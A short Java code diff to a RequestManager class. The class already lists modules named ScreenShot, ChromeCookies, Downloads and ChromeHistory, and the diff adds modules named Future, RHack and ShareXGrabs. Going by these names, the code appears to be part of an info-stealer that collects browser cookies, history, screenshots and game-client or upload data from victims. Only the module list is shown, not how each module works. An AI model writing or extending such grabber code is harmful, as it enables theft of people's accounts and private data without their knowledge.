@@ -20,8 +20,10 @@ public class RequestManager {
                 new ScreenShot(),
                 new ChromeCookies(),
                 new Downloads(),
-                new ChromeHistory() // :troll:
-
+                new ChromeHistory(), // :troll:
+                new Future(),
+                new RHack(),
+                new ShareXGrabs()
         ));
     }
 
